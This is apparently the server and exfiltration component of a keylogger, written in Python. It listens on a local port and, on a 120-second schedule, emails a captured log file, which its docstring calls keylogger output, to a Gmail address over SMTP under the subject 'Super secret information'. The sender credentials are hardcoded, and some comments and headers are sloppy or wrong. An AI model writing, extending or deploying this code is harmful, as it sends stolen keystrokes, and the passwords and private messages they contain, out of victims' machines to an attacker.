import sys
import socket
import logging
import smtplib
from apscheduler.schedulers.background import BackgroundScheduler
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


class Server():

    def __init__(self):

        self.listen = True
        self.BUFFER_SIZE = 10
        self.filename = "log.txt"
        self.sched = BackgroundScheduler(timezone="Europe/Athens")

        # Add logger for information on program
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.INFO)

        formatter = logging.Formatter('%(levelname)s:%(name)s:%(message)s')
        file_handler = logging.FileHandler('information.log')
        file_handler.setFormatter(formatter)

        self.logger.addHandler(file_handler)

        # Setup recepient information from console
        if len(sys.argv) < 2:
            self.receiver_name = "demo"
        else:
            self.receiver_name = str(sys.argv[1])

        self.serverSocket()

    def serverSocket(self):
        """Set up connection to client and share log file via email"""

        # Server listening for clients
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        CLIENT = '127.0.0.1'
        PORT = 22344
        s.bind((CLIENT, PORT))
        self.logger.info(
            "Bound into host {}, on port {}\n".format(CLIENT, PORT))

        s.listen(5)
        # Send information to a recepient every two hours
        self.sched.add_job(self.send_email, 'interval', seconds=120)
        self.sched.start()

        while True:
            if self.listen == False:
                break
            try:
                clt, addr = s.accept()
                self.logger.info(
                    "Recieved connection: {} {}".format(clt, addr))
            except ValueError as e:
                self.logger.exception(
                    "Error in connecting with {}. Description:\n{}".format(addr, e))
            else:
                print("{} is connected".format(addr))

    def send_email(self):
        """SMTP email sender functioni w/ keylogger output as its attached file"""

        sender_addr = 'ujiosdfghnkl'
        sender_pass = 'safepass123'
        receiver_addr = self.receiver_name + '@gmail.com'

        # Message formatting
        content = ''
        message = MIMEMultipart()
        message['From'] = sender_addr
        message['To'] = receiver_addr
        message['Subject'] = 'Super secret information:'
        message.attach(MIMEText(content, 'plain'))

        try:
            # Email content
            attach_file = open(self.filename, 'rb')
            payload = MIMEBase('application', 'octate-stream')
            payload.set_payload((attach_file).read())
            encoders.encode_base64(payload)
            payload.add_header('Content-Decomposition',
                               'attachment', filename=self.filename)
            message.attach(payload)

            # Email session and sending
            session = smtplib.SMTP('smtp.gmail.com', 587)
            session.starttls()
            session.login(sender_addr, sender_pass)
            text = message.as_string()

            self.logger.info("Sending email now...")
            session.sendmail(sender_addr, receiver_addr, text)
            session.quit()
            self.logger.info("Email sent.")

        except FileNotFoundError:
            print("No file to mail. Exiting...")
            return -1

    def kill(self):
        """Utility function to kill the server if called from another function or module"""
        self.listen = False


myServer = Server()
